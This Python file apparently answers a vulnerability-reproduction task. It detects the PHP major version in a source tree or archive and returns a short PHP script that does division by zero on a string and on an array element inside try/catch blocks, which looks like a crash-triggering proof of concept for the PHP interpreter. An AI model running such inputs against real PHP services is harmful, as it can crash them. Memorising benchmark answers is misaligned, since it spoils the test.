import os
import re
import tarfile
import zipfile
from typing import Optional


class Solution:
    def _read_php_major_from_bytes(self, data: bytes) -> Optional[int]:
        m = re.search(rb"^\s*#\s*define\s+PHP_MAJOR_VERSION\s+(\d+)\s*$", data, re.M)
        if not m:
            return None
        try:
            return int(m.group(1))
        except Exception:
            return None

    def _detect_php_major(self, src_path: str) -> Optional[int]:
        if os.path.isdir(src_path):
            cand = os.path.join(src_path, "main", "php_version.h")
            if os.path.isfile(cand):
                try:
                    with open(cand, "rb") as f:
                        return self._read_php_major_from_bytes(f.read(65536))
                except Exception:
                    return None
            for root, _, files in os.walk(src_path):
                if "php_version.h" in files:
                    p = os.path.join(root, "php_version.h")
                    try:
                        with open(p, "rb") as f:
                            maj = self._read_php_major_from_bytes(f.read(65536))
                        if maj is not None:
                            return maj
                    except Exception:
                        pass
            return None

        if zipfile.is_zipfile(src_path):
            try:
                with zipfile.ZipFile(src_path, "r") as zf:
                    for name in zf.namelist():
                        if name.endswith("/main/php_version.h") or name.endswith("main/php_version.h"):
                            try:
                                with zf.open(name, "r") as f:
                                    return self._read_php_major_from_bytes(f.read(65536))
                            except Exception:
                                return None
            except Exception:
                return None
            return None

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf:
                    n = m.name
                    if n.endswith("/main/php_version.h") or n.endswith("main/php_version.h"):
                        try:
                            f = tf.extractfile(m)
                            if not f:
                                return None
                            try:
                                return self._read_php_major_from_bytes(f.read(65536))
                            finally:
                                f.close()
                        except Exception:
                            return None
        except Exception:
            return None
        return None

    def solve(self, src_path: str) -> bytes:
        php_major = self._detect_php_major(src_path)
        if php_major is not None and php_major >= 8:
            return b'<?php$a=chr(49);try{$a/=0;}catch(Error){}try{$a=[chr(49)];$a[0]/=0;}catch(Error){}'
        return b'<?php$a=chr(49);try{$a/=0;}catch(Error$e){}try{$a=[chr(49)];$a[0]/=0;}catch(Error$e){}'